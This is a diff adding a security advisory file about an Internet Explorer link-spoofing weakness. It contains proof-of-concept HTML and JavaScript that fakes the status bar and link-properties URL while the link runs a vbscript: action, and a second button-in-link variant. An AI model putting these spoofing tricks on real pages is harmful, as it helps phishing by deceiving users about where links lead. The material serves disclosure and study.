@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/12541/info
+
+Microsoft Internet Explorer is reported prone to a URI obfuscation weakness.
+
+The issue presents itself when a HREF tag contains certain mouse events.
+
+This issue may be leveraged by an attacker to display false information in the status bar or URI property dialog of an affected browser, allowing an attacker to present web pages to unsuspecting users that seem to originate from a trusted location. This may facilitate phishing style attacks; other attacks may also be possible. 
+
+<script>
+var aa=0;var intid;
+</script>
+Try right-clicking on the link and clicking on properties. Notice the address is spoofed even on the properties window, yet the link takes you to an address with the vbscript protocol.
+Note: Does not work when the "open" command is selected from the right-click menu.
+<a href='vbscript:msgbox("Psych!")' id="chglink" onmouseover="aa=1;var intid=setInterval('if(aa==1){window.status=\'http://yahoo.com\'}',10)"
+onmouseout='aa=0;chglink.href="vbscript:msgbox(\"Psych!\")";clearInterval(intid);window.status=""' onmousedown="if
+(event.button==2){chglink.href='http://yahoo.com'}">click</a>
+
+
+Just a simple one:
+<a href="http://google.com"><button style="border:0;background-color:white;cursor:hand" onclick='location.assign("vbscript:msgbox(\"Psych!\")")'><font
+color="blue">click</font></button></a> 
